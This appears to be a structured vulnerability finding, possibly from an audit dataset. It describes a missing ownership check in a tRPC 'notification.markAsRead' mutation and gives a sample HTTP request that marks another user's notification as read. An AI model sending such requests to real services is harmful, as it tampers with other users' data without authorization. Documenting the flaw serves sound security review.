diagnosis: The mutation updates isRead: true based on input.notificationId without verifying that the notification belongs to recipientId: ctx.user.id. Any authenticated user can dismiss or mark as read notifications intended for other users.
exploit_request:
POST /trpc/notification.markAsRead HTTP/1.1
Host: portal.app.com
Content-Type: application/json
Authorization: Bearer <user_token>

{"notificationId": "clj901azb0001mp08yq4m892z"}
